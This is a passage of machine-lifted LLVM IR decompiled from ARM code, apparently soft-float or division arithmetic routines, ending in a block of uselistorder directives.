  %v11_1db84 = shl i32 %v3_1db84, %v10_1db84
  %v12_1db84 = zext i32 %v11_1db84 to i64
  %v14_1db84 = or i64 %v12_1db84, %v9_1db84
  %v15_1db84 = trunc i64 %v14_1db84 to i32
  %v3_1db88 = icmp uge i32 %v1_1db90, %v15_1db84
  %v3_1db8c = icmp eq i1 %v3_1db88, false
  %v4_1db8c = sub i32 %v0_1db8c, %v3_1db80
  %v6_1db8c = sext i1 %v3_1db8c to i32
  %v7_1db8c = add i32 %v6_1db8c, %v4_1db8c
  %v13_1db8c = icmp ult i32 %v0_1db8c, %v3_1db80
  %v14_1db8c = or i1 %v13_1db8c, %v3_1db8c
  br i1 %v14_1db8c, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1db90 = sub i32 %v1_1db90, %v15_1db84
  store i32 %v3_1db90, i32* %r6.global-to-local, align 4
  store i32 %v7_1db8c, i32* %r5.global-to-local, align 4
  %v5_1db98 = udiv i32 %v0_1dbd8, 4
  %v6_1db98 = or i32 %v1_1db98, %v5_1db98
  store i32 %v6_1db98, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1dbb4 = phi i32 [ %v1_1dbb457, %.thread6 ], [ %v6_1db98, %bb98 ]
  %v1_1db6033 = phi i32 [ %v1_1db6034, %.thread6 ], [ %v6_1db98, %bb98 ]
  %v1_1db7c44 = phi i32 [ %v1_1db7c45, %.thread6 ], [ %v6_1db98, %bb98 ]
  %v1_1db9853 = phi i32 [ %v1_1db98, %.thread6 ], [ %v6_1db98, %bb98 ]
  %v0_1dba8 = phi i32 [ %v0_1db8c, %.thread6 ], [ %v7_1db8c, %bb98 ]
  %v1_1dbac = phi i32 [ %v1_1db90, %.thread6 ], [ %v3_1db90, %bb98 ]
  %v1_1db9c = urem i32 %v3_1db80, 2
  %v2_1db9c = icmp ne i32 %v1_1db9c, 0
  %v3_1db9c = udiv i32 %v5_1dbd017, 8
  %v3_1dba0 = zext i1 %v2_1db9c to i32
  %v6_1dba0 = and i64 %v14_1db84, 4294967295
  %v7_1dba0 = sub i32 33, %v15_1db84
  %v8_1dba0 = zext i32 %v7_1dba0 to i64
  %v9_1dba0 = shl i64 %v6_1dba0, %v8_1dba0
  %v10_1dba0 = sub i32 32, %v15_1db84
  %v11_1dba0 = shl i32 %v3_1dba0, %v10_1dba0
  %v12_1dba0 = zext i32 %v11_1dba0 to i64
  %v14_1dba0 = or i64 %v12_1dba0, %v9_1dba0
  %v15_1dba0 = trunc i64 %v14_1dba0 to i32
  %v3_1dba4 = icmp uge i32 %v1_1dbac, %v15_1dba0
  %v3_1dba8 = icmp eq i1 %v3_1dba4, false
  %v4_1dba8 = sub i32 %v0_1dba8, %v3_1db9c
  %v6_1dba8 = sext i1 %v3_1dba8 to i32
  %v7_1dba8 = add i32 %v6_1dba8, %v4_1dba8
  %v13_1dba8 = icmp ult i32 %v0_1dba8, %v3_1db9c
  %v14_1dba8 = or i1 %v13_1dba8, %v3_1dba8
  br i1 %v14_1dba8, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1dbac = sub i32 %v1_1dbac, %v15_1dba0
  store i32 %v3_1dbac, i32* %r6.global-to-local, align 4
  store i32 %v7_1dba8, i32* %r5.global-to-local, align 4
  %v5_1dbb4 = udiv i32 %v0_1dbd8, 8
  %v6_1dbb4 = or i32 %v1_1dbb4, %v5_1dbb4
  store i32 %v6_1dbb4, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1dbc4 = phi i32 [ %v1_1dbac, %.thread8 ], [ %v3_1dbac, %bb100 ]
  %v0_1dbc0 = phi i32 [ %v0_1dba8, %.thread8 ], [ %v7_1dba8, %bb100 ]
  %v2_1dbfc = phi i32 [ %v1_1dbb4, %.thread8 ], [ %v6_1dbb4, %bb100 ]
  %v1_1db6032 = phi i32 [ %v1_1db6033, %.thread8 ], [ %v6_1dbb4, %bb100 ]
  %v1_1db7c43 = phi i32 [ %v1_1db7c44, %.thread8 ], [ %v6_1dbb4, %bb100 ]
  %v1_1db9852 = phi i32 [ %v1_1db9853, %.thread8 ], [ %v6_1dbb4, %bb100 ]
  %v2_1dbb8 = or i32 %v0_1dbc0, %v1_1dbc4
  %v4_1dbb8 = icmp eq i32 %v2_1dbb8, 0
  br i1 %v4_1dbb8, label %dec_label_pc_1dbf8, label %dec_label_pc_1dbc0

dec_label_pc_1dbc0:                               ; preds = %.thread10
  %v3_1dbc0 = mul i32 %v0_1dbc0, 16
  %v4_1dbc4 = udiv i32 %v1_1dbc4, 268435456
  %v5_1dbc4 = or i32 %v3_1dbc0, %v4_1dbc4
  store i32 %v5_1dbc4, i32* %r5.global-to-local, align 4
  %v3_1dbc8 = mul i32 %v1_1dbc4, 16
  store i32 %v3_1dbc8, i32* %r6.global-to-local, align 4
  %v3_1dbcc = mul nuw i32 %v3_1db9c, 8
  %v4_1dbd0 = udiv i32 %v15_1dba0, 536870912
  %v5_1dbd0 = or i32 %v4_1dbd0, %v3_1dbcc
  %v3_1dbd4 = mul i32 %v15_1dba0, 8
  %v3_1dbd8 = udiv i32 %v0_1dbd8, 16
  store i32 %v3_1dbd8, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1dbd8, 16
  br i1 %tmp, label %dec_label_pc_1dbe0, label %dec_label_pc_1db50

dec_label_pc_1dbe0:                               ; preds = %dec_label_pc_1dbc0
  %v1_1dbe0 = and i32 %v1_1dbfc.ph, 1048576
  %v2_1dbe0 = icmp eq i32 %v1_1dbe0, 0
  br i1 %v2_1dbe0, label %dec_label_pc_1dbe8, label %.thread11.loopexit

dec_label_pc_1dbe8:                               ; preds = %dec_label_pc_1dbe0
  %v2_1dbe8 = or i32 %v2_1dbfc, %v1_1dbfc.ph
  store i32 %v2_1dbe8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1db50.outer

dec_label_pc_1dbf8:                               ; preds = %.thread10
  store i32 %v15_1dba0, i32* %r2.global-to-local, align 4
  store i32 %v3_1db9c, i32* %r3.global-to-local, align 4
  %v1_1dbf8 = and i32 %v1_1dbfc.ph, 1048576
  %v2_1dbf8 = icmp eq i32 %v1_1dbf8, 0
  br i1 %v2_1dbf8, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1dbf8
  %v3_1dbfc = or i32 %v2_1dbfc, %v1_1dbfc.ph
  store i32 %v3_1dbfc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1dbe0
  store i32 %v3_1dbd4, i32* %r2.global-to-local, align 4
  store i32 %v5_1dbd0, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1dbf8, %bb101
  %v1_1dc04 = add nsw i32 %v4_1db24, 515
  store i32 %v1_1dc04, i32* %ip.global-to-local, align 4
  %v2_1dc04 = icmp ugt i32 %v1_1db28, 252
  %v7_1dc04 = icmp eq i32 %v1_1db28, 253
  %v2_1dc08 = xor i1 %v7_1dc04, true
  %v3_1dc08 = and i1 %v2_1dc04, %v2_1dc08
  br i1 %v3_1dc08, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1dc08 = icmp ugt i32 %v1_1dc04, 1791
  %v11_1dc08 = icmp eq i32 %v1_1dc04, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1dc0c = phi i1 [ %v7_1dc04, %.thread11 ], [ %v11_1dc08, %bb102 ]
  %v0_1dc0c = phi i1 [ %v2_1dc04, %.thread11 ], [ %v6_1dc08, %bb102 ]
  %v2_1dc0c = xor i1 %v1_1dc0c, true
  %v3_1dc0c = and i1 %v0_1dc0c, %v2_1dc0c
  call void @__pseudo_cond_branch(i1 %v3_1dc0c, i32 ptrtoint (i32* @global_var_1d920.1165 to i32))
  %v0_1dc10 = load i32, i32* %r5.global-to-local, align 4
  %v1_1dc10 = load i32, i32* %r3.global-to-local, align 4
  %v2_1dc10 = sub i32 %v0_1dc10, %v1_1dc10
  store i32 %v2_1dc10, i32* @ip, align 4
  %v3_1dc10 = icmp uge i32 %v0_1dc10, %v1_1dc10
  %v9_1dc10 = icmp eq i32 %v0_1dc10, %v1_1dc10
  br i1 %v9_1dc10, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1dc14 = load i32, i32* %r6.global-to-local, align 4
  %v2_1dc14 = load i32, i32* %r2.global-to-local, align 4
  %v3_1dc14 = sub i32 %v1_1dc14, %v2_1dc14
  store i32 %v3_1dc14, i32* @ip, align 4
  %v4_1dc14 = icmp uge i32 %v1_1dc14, %v2_1dc14
  %v10_1dc14 = icmp eq i32 %v1_1dc14, %v2_1dc14
  br i1 %v10_1dc14, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1dc18 = load i32, i32* %r0.global-to-local, align 4
  %v2_1dc18 = urem i32 %v1_1dc18, 2
  %v3_1dc18 = icmp ne i32 %v2_1dc18, 0
  %v4_1dc18 = udiv i32 %v1_1dc18, 2
  store i32 %v4_1dc18, i32* @ip, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1dc1c = phi i1 [ %v3_1dc10, %bb103 ], [ %v4_1dc14, %bb104 ], [ %v3_1dc18, %bb105 ]
  %v0_1dc1c = load i32, i32* %r0.global-to-local, align 4
  %v2_1dc1c = zext i1 %v1_1dc1c to i32
  %v3_1dc1c = add i32 %v2_1dc1c, %v0_1dc1c
  store i32 %v3_1dc1c, i32* %r0.global-to-local, align 4
  %v0_1dc20 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dc20 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dc20 = and i32 %v1_1dc20, 4096
  %v3_1dc20 = icmp ne i32 %v2_1dc20, 0
  %v4_1dc20 = mul i32 %v1_1dc20, 1048576
  %v6_1dc20 = add i32 %v4_1dc20, %v0_1dc20
  %v7_1dc20 = zext i1 %v3_1dc20 to i32
  %v8_1dc20 = add i32 %v7_1dc20, %v6_1dc20
  store i32 %v8_1dc20, i32* @r1, align 4
  %v2_1dc24 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1dc24, i32* @r4, align 4
  store i32 %v6_1dac4, i32* @r5, align 4
  store i32 %v9_1dac4, i32* @r6, align 4
  store i32 %v12_1dac4, i32* @lr, align 4
  ret i32 %v3_1dc1c

dec_label_pc_1dc2c:                               ; preds = %dec_label_pc_1dae4
  %v1_1dc2c = and i32 %v2_1dae8, -2147483648
  %v4_1dc30 = urem i32 %v1_1dad0, 1048576
  %v5_1dc30 = or i32 %v1_1dc2c, %v4_1dc30
  store i32 %v5_1dc30, i32* %r1.global-to-local, align 4
  %v6_1dc34 = add nsw i32 %v2_1dae4, 1023
  store i32 %v6_1dc34, i32* %r4.global-to-local, align 4
  %v8_1dc34 = sub nsw i32 0, %v2_1dae4
  %v9_1dc34 = and i32 %v6_1dc34, %v8_1dc34
  %v11_1dc34 = icmp slt i32 %v2_1dae4, -1023
  %v12_1dc34 = icmp eq i32 %v6_1dc34, 0
  %v7_1dc38 = icmp sgt i32 %v2_1dae4, -1023
  br i1 %v7_1dc38, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1dc2c
  %v10_1dc38 = sub nsw i32 1024, %v2_1dae4
  store i32 %v10_1dc38, i32* %r5.global-to-local, align 4
  %v14_1dc38 = and i32 %v10_1dc38, %v6_1dc34
  %v16_1dc38 = icmp slt i32 %v10_1dc38, 0
  %v17_1dc38 = icmp eq i32 %v6_1dc34, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1dc2c, %bb106
  %v3_1dc44.in = phi i32 [ %v9_1dc34, %dec_label_pc_1dc2c ], [ %v14_1dc38, %bb106 ]
  %v2_1dc44 = phi i1 [ %v11_1dc34, %dec_label_pc_1dc2c ], [ %v16_1dc38, %bb106 ]
  %v1_1dc44 = phi i1 [ %v12_1dc34, %dec_label_pc_1dc2c ], [ %v17_1dc38, %bb106 ]
  %v3_1dc44 = icmp slt i32 %v3_1dc44.in, 0
  %v3_1dc3c = xor i1 %v3_1dc44, %v2_1dc44
  %v4_1dc3c = or i1 %v1_1dc44, %v3_1dc3c
  br i1 %v4_1dc3c, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1dc3c84 = mul i32 %v6_1dc34, 1048576
  %v10_1dc3c85 = or i32 %v9_1dc3c84, %v5_1dc30
  store i32 %v10_1dc3c85, i32* %r1.global-to-local, align 4
  store i32 %v3_1dac4, i32* %r4.global-to-local, align 4
  store i32 %v6_1dac4, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1dc44 = phi i32 [ %v12_1dac4, %bb108 ], [ %v1_1dc2c, %bb107 ]
  %v6_1dc44 = xor i1 %v4_1dc3c, true
  call void @__pseudo_cond_branch(i1 %v6_1dc44, i32 %v0_1dc44)
  %v0_1dc48 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dc48 = or i32 %v0_1dc48, 1048576
  store i32 %v1_1dc48, i32* @r1, align 4
  %v0_1dc50 = load i32, i32* %r4.global-to-local, align 4
  %v1_1dc50 = add i32 %v0_1dc50, -1
  store i32 %v1_1dc50, i32* @r4, align 4
  %v3_1dc50 = sub i32 0, %v0_1dc50
  %v4_1dc50 = and i32 %v0_1dc50, %v3_1dc50
  %v5_1dc50 = icmp slt i32 %v4_1dc50, 0
  store i1 %v5_1dc50, i1* @cpsr_v, align 1
  %v6_1dc50 = icmp slt i32 %v1_1dc50, 0
  store i1 %v6_1dc50, i1* @cpsr_n, align 1
  %v7_1dc50 = icmp eq i32 %v0_1dc50, 1
  store i1 %v7_1dc50, i1* @cpsr_z, align 1
  %v0_1dc54 = call i32 @function_1d920()
  store i32 %v0_1dc54, i32* @r0, align 4
  %v0_1dc5c = call i32 @function_1d920()
  store i32 %v0_1dc5c, i32* @r0, align 4
  %v0_1dc60.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1dc64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1dc60

dec_label_pc_1dc60:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1dc60.pre-phi = phi i32 [ %v5_1dad4, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1dad4, %bb91 ], [ %v5_1dad4, %.thread ]
  %v0_1dc64 = phi i32 [ %v5_1dad0, %.thread1 ], [ %v5_1dad0, %.thread2 ], [ %v5_1dad0, %bb91 ], [ %v0_1dc64.pre, %.thread ]
  %v2_1dc68 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1dc60.pre, %.thread ]
  %v5_1dc60 = and i32 %v2_1dc68, %v4_1dc60.pre-phi
  store i32 %v5_1dc60, i32* @r5, align 4
  %v4_1dc64 = icmp eq i32 %v2_1dc68, %v0_1dc64
  br i1 %v4_1dc64, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1dc60
  %v5_1dc68 = icmp eq i32 %v5_1dc60, %v2_1dc68
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1dc60, %bb109
  %v0_1dc6c = phi i1 [ false, %dec_label_pc_1dc60 ], [ %v5_1dc68, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1dc6c, i32 ptrtoint (i32* @global_var_1dab4.1167 to i32))
  %v0_1dc70 = load i32, i32* @r4, align 4
  %v1_1dc70 = load i32, i32* %ip.global-to-local, align 4
  %v4_1dc70 = icmp eq i32 %v1_1dc70, %v0_1dc70
  br i1 %v4_1dc70, label %dec_label_pc_1dc78, label %dec_label_pc_1dc94

dec_label_pc_1dc78:                               ; preds = %bb110
  %v0_1dc78 = load i32, i32* @r0, align 4
  %v1_1dc78 = load i32, i32* @r1, align 4
  %v4_1dc78 = mul i32 %v1_1dc78, 4096
  %v5_1dc78 = or i32 %v4_1dc78, %v0_1dc78
  store i32 %v5_1dc78, i32* %r4.global-to-local, align 4
  %v1_1dc7c = icmp ne i32 %v5_1dc78, 0
  call void @__pseudo_cond_branch(i1 %v1_1dc7c, i32 ptrtoint (i32* @global_var_1dab4.1167 to i32))
  %v0_1dc80 = load i32, i32* @r5, align 4
  %v1_1dc80 = load i32, i32* %ip.global-to-local, align 4
  %v1_1dc84 = icmp ne i32 %v1_1dc80, %v0_1dc80
  call void @__pseudo_cond_branch(i1 %v1_1dc84, i32 ptrtoint (i32* @global_var_1da98.1168 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1dc90 = call i32 @function_1dab4(i32 %arg3, i32 %arg4)
  store i32 %v2_1dc90, i32* @r0, align 4
  %v1_1dc94.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1dc94

dec_label_pc_1dc94:                               ; preds = %bb110, %dec_label_pc_1dc78
  %v1_1dc94 = phi i32 [ %v1_1dc70, %bb110 ], [ %v1_1dc94.pre, %dec_label_pc_1dc78 ]
  %v0_1dc94 = load i32, i32* @r5, align 4
  %v4_1dc94 = icmp eq i32 %v0_1dc94, %v1_1dc94
  br i1 %v4_1dc94, label %dec_label_pc_1dc9c, label %dec_label_pc_1dc94.dec_label_pc_1dcb0_crit_edge

dec_label_pc_1dc94.dec_label_pc_1dcb0_crit_edge:  ; preds = %dec_label_pc_1dc94
  %v0_1dcb0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1dcb0

dec_label_pc_1dc9c:                               ; preds = %dec_label_pc_1dc94
  %v4_1dc9c = mul i32 %arg4, 4096
  %v5_1dc9c = or i32 %v4_1dc9c, %arg3
  store i32 %v5_1dc9c, i32* %r5.global-to-local, align 4
  %v7_1dc9c = icmp eq i32 %v5_1dc9c, 0
  call void @__pseudo_cond_branch(i1 %v7_1dc9c, i32 ptrtoint (i32* @global_var_1da48.1169 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1dcac = call i32 @function_1dab4(i32 %arg3, i32 %arg4)
  store i32 %v2_1dcac, i32* @r0, align 4
  br label %dec_label_pc_1dcb0

dec_label_pc_1dcb0:                               ; preds = %dec_label_pc_1dc94.dec_label_pc_1dcb0_crit_edge, %dec_label_pc_1dc9c
  %v0_1dcb0 = phi i32 [ %v0_1dcb0.pre, %dec_label_pc_1dc94.dec_label_pc_1dcb0_crit_edge ], [ %v2_1dcac, %dec_label_pc_1dc9c ]
  %v1_1dcb0 = load i32, i32* @r1, align 4
  %v3_1dcb0 = mul i32 %v1_1dcb0, 2
  %v4_1dcb0 = or i32 %v3_1dcb0, %v0_1dcb0
  store i32 %v4_1dcb0, i32* %r6.global-to-local, align 4
  %v6_1dcb0 = icmp eq i32 %v4_1dcb0, 0
  br i1 %v6_1dcb0, label %dec_label_pc_1dcb0._crit_edge, label %bb111

dec_label_pc_1dcb0._crit_edge:                    ; preds = %dec_label_pc_1dcb0
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1dcb0
  %v4_1dcb4 = mul i32 %arg4, 2
  %v5_1dcb4 = or i32 %v4_1dcb4, %arg3
  store i32 %v5_1dcb4, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1dcb4, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1dcb0._crit_edge, %bb111
  %v4_1dcc4.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1dcb0._crit_edge ], [ %v5_1dcb4, %bb111 ]
  %v0_1dcb8 = phi i1 [ false, %dec_label_pc_1dcb0._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1dcb8, i32 ptrtoint (i32* @global_var_1d9e0.1170 to i32))
  %v0_1dcbc = load i32, i32* @r0, align 4
  %v1_1dcbc = load i32, i32* @r1, align 4
  %v3_1dcbc = mul i32 %v1_1dcbc, 2
  %v4_1dcbc = or i32 %v3_1dcbc, %v0_1dcbc
  store i32 %v4_1dcbc, i32* %r4.global-to-local, align 4
  %v1_1dcc0 = icmp ne i32 %v4_1dcbc, 0
  call void @__pseudo_cond_branch(i1 %v1_1dcc0, i32 ptrtoint (i32* @global_var_1da98.1168 to i32))
  store i32 %v4_1dcc4.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1dcc8 = icmp ne i32 %v4_1dcc4.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1dcc8, i32 ptrtoint (i32* @global_var_1da48.1169 to i32))
  %v0_1dccc = load i32, i32* @r0, align 4
  %v1_1dccc = load i32, i32* @r1, align 4
  %v2_1dccc = call i32 @function_1dab4(i32 %v0_1dccc, i32 %v1_1dccc)
  store i32 %v2_1dccc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v1_1dcd4 = call i32 @function_1dce4(i32 %v2_1dccc)
  store i32 %v1_1dcd4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v1_1dcdc = call i32 @function_1dce4(i32 %v1_1dcd4)
  store i32 %v1_1dcdc, i32* %r0.global-to-local, align 4
  ret i32 %v1_1dcdc

; uselistorder directives
  uselistorder i32 %v5_1dcb4, { 1, 0, 2 }
  uselistorder i32 %v1_1dc70, { 1, 0 }
  uselistorder i32 %v1_1dc50, { 1, 0 }
  uselistorder i32 %v0_1dc50, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1dc38, { 2, 0, 1 }
  uselistorder i32 %v6_1dc34, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1dc2c, { 1, 0 }
  uselistorder i32 %v2_1dc14, { 1, 0, 2 }
  uselistorder i32 %v1_1dc14, { 1, 0, 2 }
  uselistorder i32 %v1_1dc10, { 1, 0, 2 }
  uselistorder i32 %v0_1dc10, { 1, 0, 2 }
  uselistorder i1 %v7_1dc04, { 1, 0 }
  uselistorder i32 %v2_1dbe8, { 1, 0 }
  uselistorder i32 %v3_1dbd4, { 2, 1, 0 }
  uselistorder i32 %v3_1dbc8, { 0, 2, 1 }
  uselistorder i32 %v5_1dbc4, { 2, 0, 1 }
  uselistorder i32 %v6_1dbb4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1dba0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1db9c, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1dba8, { 0, 2, 1 }
  uselistorder i32 %v1_1dbb4, { 1, 0 }
  uselistorder i32 %v6_1db98, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1db84, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1db80, { 0, 2, 1 }
  uselistorder i32 %v0_1db8c, { 0, 2, 1 }
  uselistorder i32 %v1_1db98, { 1, 0 }
  uselistorder i32 %v6_1db7c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1db68, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1db70, { 0, 2, 1 }
  uselistorder i32 %v1_1db7c, { 1, 0 }
  uselistorder i32 %v3_1db60, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1db54, { 1, 2, 0 }
  uselistorder i32 %v3_1dbd413, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1dbd017, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1db54, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1db60, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1dbfc.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1db40, { 1, 0 }
  uselistorder i32 %v0_1db44, { 1, 0 }
  uselistorder i32 %v3_1db30, { 1, 0 }
  uselistorder i1 %v1_1db24, { 1, 0 }
  uselistorder i32 %v3_1db14, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1db10, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1db08, { 2, 1, 0 }
  uselistorder i32 %v5_1db04, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1dae4, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1dad4, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1dad4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1dad0, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1dad0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1dac4, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 3, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 7, 5, 6, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11 }
  uselistorder i32* %ip.global-to-local, { 3, 5, 6, 4, 1, 2, 0, 7 }
  uselistorder i32 (i32)* @function_1dce4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1dab4, { 2, 1, 0 }
  uselistorder i32 ()* @function_1d920, { 1, 0 }
  uselistorder i1* @cpsr_n, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder i32 1024, { 2, 0, 12, 7, 8, 9, 10, 3, 11, 1, 4, 5, 6, 13 }
  uselistorder i32 1791, { 1, 0 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 11, 26, 12, 13, 2, 14, 15, 30, 104, 105, 112, 114, 16, 115, 17, 117, 118, 42, 119, 121, 135, 136, 137, 32, 31, 43, 138, 18, 139, 140, 126, 127, 141, 142, 44, 82, 83, 84, 85, 116, 122, 123, 124, 125, 45, 113, 3, 46, 143, 144, 145, 146, 37, 38, 39, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 131, 132, 128, 129, 130, 5, 4, 33, 47, 48, 49, 50, 106, 51, 107, 52, 147, 148, 149, 150, 165, 166, 151, 155, 156, 157, 53, 54, 133, 19, 152, 55, 56, 40, 158, 108, 109, 57, 58, 110, 111, 86, 87, 59, 88, 60, 61, 62, 34, 120, 41, 89, 102, 63, 64, 65, 66, 67, 68, 69, 168, 169, 0, 170, 171, 70, 134, 28, 159, 160, 161, 162, 163, 164, 81, 153, 154, 20, 27, 21, 6, 22, 23, 24, 35, 71, 72, 90, 91, 92, 93, 73, 94, 74, 75, 95, 97, 98, 76, 99, 100, 29, 36, 101, 103, 77, 167, 25, 78, 79, 172, 80, 96 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 83, 82, 34, 6, 7, 23, 8, 114, 115, 122, 124, 125, 126, 127, 9, 128, 129, 130, 131, 132, 133, 35, 86, 67, 68, 84, 142, 143, 144, 145, 30, 155, 87, 88, 89, 90, 134, 135, 136, 137, 138, 139, 140, 141, 123, 156, 157, 243, 244, 59, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 146, 147, 148, 149, 158, 159, 160, 161, 162, 163, 164, 165, 166, 10, 60, 167, 42, 168, 169, 85, 193, 170, 150, 32, 151, 152, 154, 171, 172, 173, 116, 117, 118, 119, 120, 121, 91, 92, 93, 94, 69, 262, 263, 36, 95, 11, 108, 111, 96, 33, 194, 195, 196, 197, 198, 199, 200, 201, 12, 72, 202, 203, 204, 205, 206, 207, 208, 209, 13, 210, 211, 212, 213, 14, 214, 215, 15, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 233, 226, 227, 228, 229, 73, 25, 230, 231, 232, 74, 75, 16, 234, 235, 236, 237, 239, 240, 76, 17, 241, 18, 238, 153, 63, 64, 61, 62, 26, 27, 39, 40, 65, 264, 176, 177, 80, 178, 179, 180, 181, 31, 182, 77, 78, 183, 184, 185, 66, 186, 187, 188, 189, 28, 29, 190, 191, 192, 79, 174, 175, 70, 81, 37, 19, 20, 24, 21, 97, 98, 99, 100, 101, 102, 103, 22, 38, 58, 57, 54, 55, 56, 53, 51, 52, 50, 48, 49, 47, 46, 44, 45, 104, 105, 106, 107, 43, 71, 41, 109, 110, 112, 113, 242 }
  uselistorder i32 4, {}
  uselistorder i32 32, { 88, 89, 90, 91, 30, 31, 39, 82, 83, 33, 34, 92, 32, 40, 93, 94, 95, 96, 37, 97, 98, 100, 101, 111, 49, 84, 112, 102, 50, 105, 106, 51, 99, 127, 41, 35, 109, 107, 108, 113, 52, 22, 114, 124, 110, 53, 103, 104, 43, 42, 54, 58, 55, 59, 56, 60, 57, 61, 69, 70, 68, 71, 72, 73, 74, 75, 76, 63, 64, 1, 65, 2, 66, 4, 3, 62, 67, 77, 125, 6, 5, 8, 7, 10, 9, 36, 115, 116, 21, 117, 0, 78, 118, 119, 120, 121, 122, 123, 23, 85, 126, 45, 44, 38, 86, 12, 11, 24, 46, 79, 87, 25, 14, 13, 16, 15, 26, 27, 18, 17, 28, 47, 48, 20, 19, 29, 80, 81 }
  uselistorder i32 33, { 5, 6, 7, 3, 8, 9, 10, 0, 2, 1, 4 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
